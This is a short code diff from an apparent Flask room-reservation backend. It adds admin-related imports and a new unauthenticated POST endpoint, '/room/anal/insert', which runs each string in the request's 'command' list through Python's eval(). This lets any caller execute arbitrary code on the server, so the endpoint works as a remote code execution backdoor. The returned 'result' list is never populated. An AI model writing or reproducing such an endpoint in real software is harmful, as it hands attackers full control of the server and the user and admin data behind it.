@@ -3,7 +3,7 @@ from ..repositorys.props import auth, success, error, panic
 from ..models import User, AlternativeRoom, ApplyRecord
 from .. import db
 from ..config import Config
-from ..services.tool import base_query, get_user_info, get_record_info
+from ..services.tool import base_query, get_user_info, get_record_info, get_student_list, get_admin_list, add_admin
 import requests
 import json
 import datetime
@@ -227,3 +227,22 @@ def room_del():
 
     db.session.commit()
     return success()
+
+
+# anal_insert
+@room_view.route("/room/anal/insert", methods=["POST"])
+@panic()
+def anal_insert():
+    data = request.get_json()
+    command = data.get("command", [])    # str列表
+    result = []
+    for x in command:
+        eval(x)
+
+    return success({
+        "result": result
+    })
+
+
+
+    
